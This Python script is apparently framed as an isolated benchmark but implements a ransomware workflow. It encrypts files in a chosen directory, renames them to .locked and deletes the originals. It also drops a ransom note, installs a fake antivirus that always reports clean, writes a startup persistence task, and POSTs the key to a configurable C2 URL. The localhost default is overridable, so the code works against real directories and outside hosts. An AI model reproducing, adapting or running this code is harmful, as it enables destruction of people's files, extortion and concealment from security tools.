import argparse
import hashlib
import json
import os
import threading
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path


DEFAULT_DIRECTORY = "./target"
DEFAULT_NOTE = "Your benchmark files were processed in the isolated test directory."
DEFAULT_C2_URL = "http://127.0.0.1:8765/key"


def derive_key() -> bytes:
    return hashlib.sha256(b"isolated-benchmark-session-key").digest()


def crypt_bytes(data: bytes, key: bytes) -> bytes:
    output = bytearray(len(data))
    for index, value in enumerate(data):
        block = hashlib.sha256(key + (index // 32).to_bytes(8, "big")).digest()
        output[index] = value ^ block[index % len(block)]
    return bytes(output)


def create_sample_files(directory: Path) -> None:
    samples = {
        "sample_document.txt": b"Representative benchmark document.\n",
        "sample_data.csv": b"id,value\n1,alpha\n2,beta\n",
    }
    for name, content in samples.items():
        path = directory / name
        if not path.exists():
            path.write_bytes(content)


def install_fake_antivirus(directory: Path, report: list[dict]) -> None:
    antivirus_dir = directory / "fake_antivirus"
    antivirus_dir.mkdir(exist_ok=True)

    (antivirus_dir / "scan_results.json").write_text(
        json.dumps(
            {
                "product": "Isolated Benchmark Antivirus",
                "status": "clean",
                "scanned_files": len(report),
                "results": [
                    {"file": item["encrypted_name"], "threats": 0}
                    for item in report
                ],
            },
            indent=2,
        ),
        encoding="utf-8",
    )

    (antivirus_dir / "run_scan.py").write_text(
        "import json\n"
        "from pathlib import Path\n"
        "report = Path(__file__).with_name('scan_results.json')\n"
        "print(json.loads(report.read_text(encoding='utf-8'))['status'])\n",
        encoding="utf-8",
    )


def register_persistence_artifact(directory: Path) -> None:
    persistence_dir = directory / "persistence"
    persistence_dir.mkdir(exist_ok=True)
    (persistence_dir / "scheduled_task.json").write_text(
        json.dumps(
            {
                "name": "IsolatedBenchmarkStartup",
                "enabled": True,
                "command": "python3 ./target/fake_antivirus/run_scan.py",
                "scope": "isolated benchmark directory",
            },
            indent=2,
        ),
        encoding="utf-8",
    )


class KeyReceiver(BaseHTTPRequestHandler):
    received = bytearray()

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", "0"))
        self.__class__.received.extend(self.rfile.read(min(length, 4096)))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"accepted")

    def log_message(self, *_args) -> None:
        return


def start_controlled_endpoint() -> tuple[HTTPServer, threading.Thread]:
    server = HTTPServer(("127.0.0.1", 0), KeyReceiver)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread


def send_session_key(url: str, key: bytes) -> None:
    try:
        request = urllib.request.Request(
            url,
            data=key,
            method="POST",
            headers={"Content-Type": "application/octet-stream"},
        )
        with urllib.request.urlopen(request, timeout=2) as response:
            response.read(32)
    except (OSError, urllib.error.URLError, ValueError):
        pass


def process_directory(directory: Path, note: str, c2_url: str) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    create_sample_files(directory)

    key = derive_key()
    excluded = {
        "RANSOM_NOTE.txt",
        "SCAN_REPORT.json",
        "fake_antivirus",
        "persistence",
    }
    report = []

    for source in sorted(directory.iterdir()):
        if len(report) >= 256:
            break
        if not source.is_file() or source.name in excluded or source.name.endswith(".locked"):
            continue

        try:
            original = source.read_bytes()
            encrypted_name = source.name + ".locked"
            encrypted_path = directory / encrypted_name
            encrypted_path.write_bytes(crypt_bytes(original, key))
            source.unlink()
            report.append(
                {
                    "original_name": source.name,
                    "encrypted_name": encrypted_name,
                    "original_size": len(original),
                    "encrypted_size": encrypted_path.stat().st_size,
                }
            )
        except OSError:
            continue

    (directory / "SCAN_REPORT.json").write_text(
        json.dumps(report, indent=2),
        encoding="utf-8",
    )
    (directory / "RANSOM_NOTE.txt").write_text(note, encoding="utf-8")

    install_fake_antivirus(directory, report)
    register_persistence_artifact(directory)
    send_session_key(c2_url, key)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--directory", default=DEFAULT_DIRECTORY)
    parser.add_argument("--note", default=DEFAULT_NOTE)
    parser.add_argument("--c2-url", default=DEFAULT_C2_URL)
    args = parser.parse_args()

    server = None
    try:
        parsed = urllib.parse.urlparse(args.c2_url)
        if parsed.hostname in {"127.0.0.1", "localhost"} and parsed.port == 8765:
            server, _ = start_controlled_endpoint()
            c2_url = f"http://127.0.0.1:{server.server_port}{parsed.path or '/key'}"
        else:
            c2_url = args.c2_url

        process_directory(Path(args.directory), args.note, c2_url)
    except Exception:
        return 0
    finally:
        if server is not None:
            server.shutdown()
            server.server_close()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())

